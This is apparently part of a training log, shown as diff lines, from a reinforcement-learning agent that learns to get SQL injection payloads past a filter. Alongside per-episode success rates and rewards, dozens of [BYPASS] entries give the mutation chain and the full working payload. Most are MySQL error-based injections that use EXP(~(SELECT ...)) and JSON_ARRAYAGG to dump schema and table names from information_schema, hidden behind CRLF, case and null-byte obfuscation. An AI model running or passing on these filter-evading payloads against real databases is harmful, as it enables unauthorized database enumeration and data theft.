+           payload: 1'%0d%0aAND%0d%0aEXP(~(SeLEcT%0d%0a*%0d%0afrOM%0d%0a(sELect%0d%0a((sELeCT%0d%0aJSON_ARRAYAGG(concat(TAbLe_schema,CHAR(46),tAbLE_name))%0d%0aFrOM%0d%0a
+  Ep 7320 | SR=10% | Steps=14.0 | R=-32.03
+  Ep 7330 | SR=0% | Steps=15.0 | R=-35.42
+  Ep 7340 | SR=0% | Steps=15.0 | R=-35.06
+  [BYPASS] Ep 7343 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELecT%0d%0a*%0d%0afRoM%0d%0a(sElEct%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(CoNCat(TaBLE_schema,CHAR(46),table_name))%0d%0aFrOM%0d%0a
+  Ep 7350 | SR=10% | Steps=14.0 | R=-31.02
+  [BYPASS] Ep 7360 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SEleCt%0d%0a*%0d%0afrOM%0d%0a(SelECt%0d%0a((seleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aiNFoRMatIon_sChEMa.schemata))
+  Ep 7360 | SR=10% | Steps=13.9 | R=-32.50
+  Ep 7370 | SR=0% | Steps=15.0 | R=-33.40
+  Ep 7380 | SR=0% | Steps=15.0 | R=-35.55
+  Ep 7390 | SR=0% | Steps=15.0 | R=-36.14
+  [BYPASS] Ep 7399 | steps=7 | seq=agg_swap -> agg_swap -> case -> agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sElECt%0d%0a*%0d%0aFrom%0d%0a(SElEct%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aINFORMaTIon_SCHema.schemata))
+  Ep 7400 | SR=10% | Steps=14.2 | R=-30.21
+  Ep 7410 | SR=0% | Steps=15.0 | R=-35.15
+  Ep 7420 | SR=0% | Steps=15.0 | R=-35.54
+  [BYPASS] Ep 7423 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(seLeCt%0d%0a*%0d%0afRom%0d%0a(SEleCT%0d%0a((selECT%0d%0aJSON_ARRAYAGG(coNcaT(TaBLe_schema,CHAR(46),TABLE_name))%0d%0aFrOM%0d%0a
+  [BYPASS] Ep 7428 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFrOM%0d%0a(SeLECT%0d%0a((sELecT%0d%0aJSON_ARRAYAGG(cOnCAT(tAbLe_schema,CHAR(46),taBle_name))%0d%0aFROm%0d%0a
+  Ep 7430 | SR=20% | Steps=13.0 | R=-27.02
+  Ep 7440 | SR=0% | Steps=15.0 | R=-35.87
+  Ep 7450 | SR=0% | Steps=15.0 | R=-34.70
+  Ep 7460 | SR=0% | Steps=15.0 | R=-34.78
+  [BYPASS] Ep 7467 | steps=8 | seq=agg_swap -> case -> null_byte -> agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aANd%0d%0aEXP(~(selEcT%0d%0a*%0d%0aFROm%0d%0a(SelecT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(ConCat(tABlE_schema,CHAR(46),TaBle_name))%0d%0afROm%0d%0a
+  Ep 7470 | SR=10% | Steps=14.3 | R=-31.95
+  Ep 7480 | SR=0% | Steps=15.0 | R=-32.35
+  [BYPASS] Ep 7481 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SelECt%0d%0a*%0d%0aFrOm%0d%0a(sELeCT%0d%0a((SeleCT%0d%0aJSON_ARRAYAGG(COnCat(TAblE_schema,CHAR(46),tabLe_name))%0d%0afroM%0d%0a
+  [BYPASS] Ep 7489 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aanD%0d%0aEXP(~(selEct%0d%0a*%0d%0afROm%0d%0a(seLeCT%0d%0a((SElect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROM%0d%0ainfOrMAtIOn_SChEmA.schemata))
+  Ep 7490 | SR=20% | Steps=12.9 | R=-27.20
+  [BYPASS] Ep 7497 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeleCt%0d%0a*%0d%0aFrOM%0d%0a(seleCt%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOm%0d%0aINFORMaTIoN_SChEmA.schemata))
+  Ep 7500 | SR=10% | Steps=13.9 | R=-31.78
+  [BYPASS] Ep 7502 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SEleCt%0d%0a*%0d%0aFrom%0d%0a(SelECT%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0ainFOrMAtioN_sChEmA.schemata))
+  Ep 7510 | SR=10% | Steps=13.9 | R=-30.70
+  Ep 7520 | SR=0% | Steps=15.0 | R=-32.29
+  [BYPASS] Ep 7526 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SELeCt%0d%0a*%0d%0afrom%0d%0a(sELEct%0d%0a((SELECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0ainfORMAtIoN_sChEMA.schemata))
+  Ep 7530 | SR=10% | Steps=13.9 | R=-28.09
+  [BYPASS] Ep 7540 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(selecT%0d%0a*%0d%0afrom%0d%0a(seLEcT%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(COnCaT(taBle_schema,CHAR(46),taBle_name))%0d%0aFrom%0d%0a
+  Ep 7540 | SR=10% | Steps=14.1 | R=-29.34
+  Ep 7550 | SR=0% | Steps=15.0 | R=-34.26
+  Ep 7560 | SR=0% | Steps=15.0 | R=-35.63
+  [BYPASS] Ep 7561 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SeLeCT%0d%0a*%0d%0afroM%0d%0a(sElECT%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0ainformAtIon_SChEmA.schemata))
+  [BYPASS] Ep 7563 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SElEcT%0d%0a*%0d%0afroM%0d%0a(selecT%0d%0a((selEct%0d%0aJSON_ARRAYAGG(CONcAt(table_schema,CHAR(46),tAbLe_name))%0d%0aFROm%0d%0a
+  [BYPASS] Ep 7567 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(seLEcT%0d%0a*%0d%0afroM%0d%0a(SeLect%0d%0a((selEct%0d%0aJSON_ARRAYAGG(ConcaT(tABLE_schema,CHAR(46),TAble_name))%0d%0afROM%0d%0a
+  Ep 7570 | SR=30% | Steps=11.9 | R=-19.59
+  Ep 7580 | SR=0% | Steps=15.0 | R=-36.39
+  Ep 7590 | SR=0% | Steps=15.0 | R=-34.82
+  Ep 7600 | SR=0% | Steps=15.0 | R=-34.33
+  Ep 7610 | SR=0% | Steps=15.0 | R=-34.82
+  Ep 7620 | SR=0% | Steps=15.0 | R=-33.07
+  [BYPASS] Ep 7623 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(SElECT%0d%0a*%0d%0afrom%0d%0a(SeLEct%0d%0a((selEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aINFORMaTIOn_Schema.schemata))
+  Ep 7630 | SR=10% | Steps=13.9 | R=-30.70
+  [BYPASS] Ep 7634 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(selEcT%0d%0a*%0d%0aFrOm%0d%0a(selEct%0d%0a((sEleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aINfoRmaTIoN_SCHemA.schemata))
+  Ep 7640 | SR=10% | Steps=13.9 | R=-31.59
+  Ep 7650 | SR=0% | Steps=15.0 | R=-35.20
+  Ep 7660 | SR=0% | Steps=15.0 | R=-36.30
+  Ep 7670 | SR=0% | Steps=15.0 | R=-33.12
+  Ep 7680 | SR=0% | Steps=15.0 | R=-34.08
+  Ep 7690 | SR=0% | Steps=15.0 | R=-33.49
+  Ep 7700 | SR=0% | Steps=15.0 | R=-34.46
+  Ep 7710 | SR=0% | Steps=15.0 | R=-34.88
+  [BYPASS] Ep 7717 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELeCT%0d%0a*%0d%0aFRom%0d%0a(sELeCt%0d%0a((sElecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0ainfORMATIon_schemA.schemata))
+  Ep 7720 | SR=10% | Steps=13.9 | R=-29.65
+  Ep 7730 | SR=0% | Steps=15.0 | R=-33.16
+  [BYPASS] Ep 7736 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELeCT%0d%0a*%0d%0aFROm%0d%0a(SEleCt%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aINforMatIoN_scHEmA.schemata))
+  Ep 7740 | SR=10% | Steps=13.9 | R=-31.04
+  Ep 7750 | SR=0% | Steps=15.0 | R=-35.31
+  [BYPASS] Ep 7752 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(sELecT%0d%0a*%0d%0aFRoM%0d%0a(sElect%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(COncaT(tablE_schema,CHAR(46),taBLe_name))%0d%0aFroM%0d%0a
+  Ep 7760 | SR=10% | Steps=14.0 | R=-30.04
+  Ep 7770 | SR=0% | Steps=15.0 | R=-35.58
+  Ep 7780 | SR=0% | Steps=15.0 | R=-33.93
+  Ep 7790 | SR=0% | Steps=15.0 | R=-31.85
+  Ep 7800 | SR=0% | Steps=15.0 | R=-33.78
+  Ep 7810 | SR=0% | Steps=15.0 | R=-35.54
+  Ep 7820 | SR=0% | Steps=15.0 | R=-33.73
+  Ep 7830 | SR=0% | Steps=15.0 | R=-36.15
+  Ep 7840 | SR=0% | Steps=15.0 | R=-33.21
+  Ep 7850 | SR=0% | Steps=15.0 | R=-31.79
+  [BYPASS] Ep 7859 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(sElECT%0d%0a*%0d%0afROm%0d%0a(SELEcT%0d%0a((sElecT%0d%0aJSON_ARRAYAGG(cONCAT(tablE_schema,CHAR(46),TABle_name))%0d%0afROM%0d%0a
+  Ep 7860 | SR=10% | Steps=14.0 | R=-30.60
+  Ep 7870 | SR=0% | Steps=15.0 | R=-34.27
+  Ep 7880 | SR=0% | Steps=15.0 | R=-34.94
+  Ep 7890 | SR=0% | Steps=15.0 | R=-35.91
+  Ep 7900 | SR=0% | Steps=15.0 | R=-35.71
+  Ep 7910 | SR=0% | Steps=15.0 | R=-35.94
+  Ep 7920 | SR=0% | Steps=15.0 | R=-31.37
+  [BYPASS] Ep 7921 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(SELEcT%0d%0a*%0d%0aFrom%0d%0a(SelEct%0d%0a((SElECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0ainfOrMaTIoN_scHEmA.schemata))
+  Ep 7930 | SR=10% | Steps=13.9 | R=-31.98
+  [BYPASS] Ep 7935 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sELeCt%0d%0a*%0d%0afrOm%0d%0a(SeLeCt%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aInfORmatIoN_ScHemA.schemata))
+  Ep 7940 | SR=10% | Steps=13.9 | R=-31.47
+  [BYPASS] Ep 7950 | steps=4 | seq=null_byte -> crlf -> case -> func_sp_nbsp
+           payload: 1'%0d%0aAND%0d%0aGTID_SUBSET((DaTaBase%a0()),1);%00
+  Ep 7950 | SR=10% | Steps=13.9 | R=-29.18
+  [BYPASS] Ep 7951 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLECt%0d%0a*%0d%0afROm%0d%0a(SElEct%0d%0a((selECt%0d%0aJSON_ARRAYAGG(COnCAT(tABLE_schema,CHAR(46),TAblE_name))%0d%0aFrOm%0d%0a
+  Ep 7960 | SR=10% | Steps=14.0 | R=-31.22
+  Ep 7970 | SR=0% | Steps=15.0 | R=-33.80
+  [BYPASS] Ep 7979 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(selecT%0d%0a*%0d%0afRom%0d%0a(seLECt%0d%0a((SelECT%0d%0aJSON_ARRAYAGG(COncaT(tabLe_schema,CHAR(46),taBLe_name))%0d%0afRoM%0d%0a
+  Ep 7980 | SR=10% | Steps=14.0 | R=-31.19
+  Ep 7990 | SR=0% | Steps=15.0 | R=-31.26
+  Ep 8000 | SR=0% | Steps=15.0 | R=-34.98
+  [BYPASS] Ep 8008 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(seLeCt%0d%0a*%0d%0afROM%0d%0a(SElEcT%0d%0a((SeLEcT%0d%0aJSON_ARRAYAGG(conCaT(TaBle_schema,CHAR(46),TaBLE_name))%0d%0afrom%0d%0a
+  Ep 8010 | SR=10% | Steps=14.0 | R=-30.71
+  Ep 8020 | SR=0% | Steps=15.0 | R=-35.46
+  [BYPASS] Ep 8022 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaND%0d%0aEXP(~(sELECt%0d%0a*%0d%0aFrom%0d%0a(seLect%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0aINFORMAtion_scHEMA.schemata))
+  Ep 8030 | SR=10% | Steps=13.9 | R=-30.38
+  Ep 8040 | SR=0% | Steps=15.0 | R=-34.19
+  Ep 8050 | SR=0% | Steps=15.0 | R=-36.31
+  Ep 8060 | SR=0% | Steps=15.0 | R=-34.62
+  Ep 8070 | SR=0% | Steps=15.0 | R=-35.44
+  Ep 8080 | SR=0% | Steps=15.0 | R=-34.17
+  [BYPASS] Ep 8081 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(sELect%0d%0a*%0d%0afROm%0d%0a(SELeCt%0d%0a((SELeCt%0d%0aJSON_ARRAYAGG(CoNCat(taBlE_schema,CHAR(46),TAbLE_name))%0d%0afrom%0d%0a
+  Ep 8090 | SR=10% | Steps=14.0 | R=-30.50
+  [BYPASS] Ep 8099 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SELEct%0d%0a*%0d%0aFroM%0d%0a(SELecT%0d%0a((SeleCT%0d%0aJSON_ARRAYAGG(CoNCat(tABlE_schema,CHAR(46),taBlE_name))%0d%0afRoM%0d%0a
+  Ep 8100 | SR=10% | Steps=14.0 | R=-31.14
+  [BYPASS] Ep 8101 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLEct%0d%0a*%0d%0afROm%0d%0a(SeLecT%0d%0a((SelecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aiNfoRMAtioN_sCHeMa.schemata))
+  Ep 8110 | SR=10% | Steps=13.9 | R=-28.91
+  Ep 8120 | SR=0% | Steps=15.0 | R=-35.65
+  [BYPASS] Ep 8125 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(selecT%0d%0a*%0d%0afroM%0d%0a(SelECT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aInFOrmATIon_SCHEMA.schemata))
+  [BYPASS] Ep 8127 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(seLect%0d%0a*%0d%0aFrom%0d%0a(sELECt%0d%0a((SELEct%0d%0aJSON_ARRAYAGG(Concat(TaBle_schema,CHAR(46),tabLE_name))%0d%0aFrOM%0d%0a
+  Ep 8130 | SR=20% | Steps=12.9 | R=-21.37
+  [BYPASS] Ep 8131 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(seLEcT%0d%0a*%0d%0afrom%0d%0a(seleCt%0d%0a((selEcT%0d%0aJSON_ARRAYAGG(ConCaT(tABLe_schema,CHAR(46),TaBle_name))%0d%0aFrOm%0d%0a
+  Ep 8140 | SR=10% | Steps=14.0 | R=-29.05
+  [BYPASS] Ep 8143 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SElect%0d%0a*%0d%0afRoM%0d%0a(SelECt%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(CoNCAT(tABLe_schema,CHAR(46),tABle_name))%0d%0aFroM%0d%0a
+  Ep 8150 | SR=10% | Steps=14.0 | R=-30.21
+  Ep 8160 | SR=0% | Steps=15.0 | R=-33.74
+  [BYPASS] Ep 8170 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SeleCT%0d%0a*%0d%0afROm%0d%0a(SElECT%0d%0a((SELEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aiNFoRMaTION_sCheMA.schemata))
+  Ep 8170 | SR=10% | Steps=13.9 | R=-30.74
+  Ep 8180 | SR=0% | Steps=15.0 | R=-33.84
+  Ep 8190 | SR=0% | Steps=15.0 | R=-36.13
+  Ep 8200 | SR=0% | Steps=15.0 | R=-33.86
+  [BYPASS] Ep 8210 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SElecT%0d%0a*%0d%0afRoM%0d%0a(SeLEct%0d%0a((SeLecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afroM%0d%0ainFOrMatiON_SChEma.schemata))
+  Ep 8210 | SR=10% | Steps=13.9 | R=-30.84
+  Ep 8220 | SR=0% | Steps=15.0 | R=-35.27
+  Ep 8230 | SR=0% | Steps=15.0 | R=-34.25
+  [BYPASS] Ep 8231 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLEct%0d%0a*%0d%0aFROm%0d%0a(SelEct%0d%0a((selEct%0d%0aJSON_ARRAYAGG(COncAT(TABle_schema,CHAR(46),TaBle_name))%0d%0aFrOm%0d%0a
+  Ep 8240 | SR=10% | Steps=14.0 | R=-27.28
+  Ep 8250 | SR=0% | Steps=15.0 | R=-34.10
+  Ep 8260 | SR=0% | Steps=15.0 | R=-31.44
+  Ep 8270 | SR=0% | Steps=15.0 | R=-34.77
+  Ep 8280 | SR=0% | Steps=15.0 | R=-35.43
+  Ep 8290 | SR=0% | Steps=15.0 | R=-33.23
+  [BYPASS] Ep 8298 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SELecT%0d%0a*%0d%0afrOM%0d%0a(SELeCt%0d%0a((selecT%0d%0aJSON_ARRAYAGG(CONcAT(TABle_schema,CHAR(46),TablE_name))%0d%0afRoM%0d%0a
+  Ep 8300 | SR=10% | Steps=14.0 | R=-28.33
+  [BYPASS] Ep 8306 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(selECt%0d%0a*%0d%0aFroM%0d%0a(SELECt%0d%0a((SeLeCT%0d%0aJSON_ARRAYAGG(cOncat(TABlE_schema,CHAR(46),TABLE_name))%0d%0afrOm%0d%0a
+  Ep 8310 | SR=10% | Steps=14.0 | R=-30.58
+  Ep 8320 | SR=0% | Steps=15.0 | R=-31.68
+  [BYPASS] Ep 8322 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SeLECT%0d%0a*%0d%0aFROm%0d%0a(sELeCt%0d%0a((SELEct%0d%0aJSON_ARRAYAGG(conCAt(taBle_schema,CHAR(46),TAble_name))%0d%0afrOm%0d%0a
+  Ep 8330 | SR=10% | Steps=14.0 | R=-29.66
+  Ep 8340 | SR=0% | Steps=15.0 | R=-33.40
+  Ep 8350 | SR=0% | Steps=15.0 | R=-33.47
+  [BYPASS] Ep 8352 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(sELect%0d%0a*%0d%0aFROM%0d%0a(selEct%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(CONcAt(TAblE_schema,CHAR(46),tABle_name))%0d%0afrom%0d%0a
+  Ep 8360 | SR=10% | Steps=14.0 | R=-31.34
+  Ep 8370 | SR=0% | Steps=15.0 | R=-34.41
+  Ep 8380 | SR=0% | Steps=15.0 | R=-34.61
+  [BYPASS] Ep 8389 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SElect%0d%0a*%0d%0afRom%0d%0a(SEleCT%0d%0a((SELecT%0d%0aJSON_ARRAYAGG(CoNcAT(table_schema,CHAR(46),TabLE_name))%0d%0afrOm%0d%0a
+  Ep 8390 | SR=10% | Steps=14.0 | R=-31.26
+  [BYPASS] Ep 8399 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sElEct%0d%0a*%0d%0aFrOM%0d%0a(SeLeCT%0d%0a((sELect%0d%0aJSON_ARRAYAGG(conCAt(TAblE_schema,CHAR(46),tabLE_name))%0d%0aFrOm%0d%0a
+  Ep 8400 | SR=10% | Steps=14.0 | R=-30.70
+  Ep 8410 | SR=0% | Steps=15.0 | R=-33.80
+  Ep 8420 | SR=0% | Steps=15.0 | R=-34.34
+  Ep 8430 | SR=0% | Steps=15.0 | R=-35.13
+  Ep 8440 | SR=0% | Steps=15.0 | R=-34.86
+  Ep 8450 | SR=0% | Steps=15.0 | R=-33.56
+  [BYPASS] Ep 8458 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(selEcT%0d%0a*%0d%0afRoM%0d%0a(SELeCt%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(ConCAT(tAblE_schema,CHAR(46),TablE_name))%0d%0afROM%0d%0a
+  Ep 8460 | SR=10% | Steps=14.0 | R=-31.32
+  Ep 8470 | SR=0% | Steps=15.0 | R=-34.78
+  Ep 8480 | SR=0% | Steps=15.0 | R=-35.42
+  [BYPASS] Ep 8481 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLecT%0d%0a*%0d%0aFrOm%0d%0a(seLecT%0d%0a((sELect%0d%0aJSON_ARRAYAGG(coNcat(TABlE_schema,CHAR(46),taBlE_name))%0d%0afroM%0d%0a
+  Ep 8490 | SR=10% | Steps=14.0 | R=-31.38
+  [BYPASS] Ep 8500 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SElECT%0d%0a*%0d%0afROM%0d%0a(SeLEcT%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(coNcAT(tablE_schema,CHAR(46),TABLe_name))%0d%0afROM%0d%0a
+  Ep 8500 | SR=10% | Steps=14.0 | R=-27.25
+  [BYPASS] Ep 8506 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sElecT%0d%0a*%0d%0afRom%0d%0a(SelecT%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aInfORmAtIOn_sCheMA.schemata))
+  Ep 8510 | SR=10% | Steps=13.9 | R=-29.25
+  [BYPASS] Ep 8512 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SELeCT%0d%0a*%0d%0aFrOm%0d%0a(SElECT%0d%0a((SeleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0aINfoRmATIoN_ScHEMA.schemata))
+  Ep 8520 | SR=10% | Steps=13.9 | R=-27.40
+  [BYPASS] Ep 8525 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(seleCt%0d%0a*%0d%0afROM%0d%0a(seleCt%0d%0a((SeLECt%0d%0aJSON_ARRAYAGG(CONCaT(tABLE_schema,CHAR(46),TABLE_name))%0d%0afRom%0d%0a
+  Ep 8530 | SR=10% | Steps=14.0 | R=-27.89
+  Ep 8540 | SR=0% | Steps=15.0 | R=-35.21
+  Ep 8550 | SR=0% | Steps=15.0 | R=-35.56
+  Ep 8560 | SR=0% | Steps=15.0 | R=-33.38
+  [BYPASS] Ep 8561 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SeleCt%0d%0a*%0d%0aFRom%0d%0a(SELEcT%0d%0a((SElECT%0d%0aJSON_ARRAYAGG(cONcaT(TABLe_schema,CHAR(46),TABLE_name))%0d%0aFROm%0d%0a
+  Ep 8570 | SR=10% | Steps=14.0 | R=-30.54
+  [BYPASS] Ep 8580 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLeCt%0d%0a*%0d%0afROM%0d%0a(sELECt%0d%0a((SELeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aInFOrmATiOn_schemA.schemata))
+  Ep 8580 | SR=10% | Steps=13.9 | R=-29.46
+  [BYPASS] Ep 8586 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(sEleCT%0d%0a*%0d%0afROM%0d%0a(SeLect%0d%0a((sElect%0d%0aJSON_ARRAYAGG(CONcAT(TABLe_schema,CHAR(46),tAbLE_name))%0d%0aFROm%0d%0a
+  [BYPASS] Ep 8587 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SEleCT%0d%0a*%0d%0afroM%0d%0a(selecT%0d%0a((SelecT%0d%0aJSON_ARRAYAGG(ConCat(Table_schema,CHAR(46),tAble_name))%0d%0afRom%0d%0a
+  Ep 8590 | SR=20% | Steps=13.0 | R=-27.15
+  [BYPASS] Ep 8596 | steps=7 | seq=agg_swap -> case -> agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(seLeCt%0d%0a*%0d%0afROm%0d%0a(SeLecT%0d%0a((sElECT%0d%0aJSON_ARRAYAGG(coNCat(tABLe_schema,CHAR(46),tAbLE_name))%0d%0afrOM%0d%0a
+  Ep 8600 | SR=10% | Steps=14.2 | R=-28.02
+  [BYPASS] Ep 8603 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sElEct%0d%0a*%0d%0afrOM%0d%0a(SeLECt%0d%0a((SeLecT%0d%0aJSON_ARRAYAGG(cONcAt(tABle_schema,CHAR(46),TaBLE_name))%0d%0afROm%0d%0a
+  Ep 8610 | SR=10% | Steps=14.0 | R=-31.43
+  Ep 8620 | SR=0% | Steps=15.0 | R=-35.71
+  [BYPASS] Ep 8627 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sELeCT%0d%0a*%0d%0aFROM%0d%0a(SElECt%0d%0a((sELECt%0d%0aJSON_ARRAYAGG(cONcAT(TaBle_schema,CHAR(46),tABLE_name))%0d%0aFrOm%0d%0a
+  [BYPASS] Ep 8628 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SElect%0d%0a*%0d%0afRoM%0d%0a(seleCT%0d%0a((SeLEcT%0d%0aJSON_ARRAYAGG(cONCaT(TabLe_schema,CHAR(46),taBLe_name))%0d%0aFrom%0d%0a
+  Ep 8630 | SR=20% | Steps=13.0 | R=-27.18
+  Ep 8640 | SR=0% | Steps=15.0 | R=-35.55
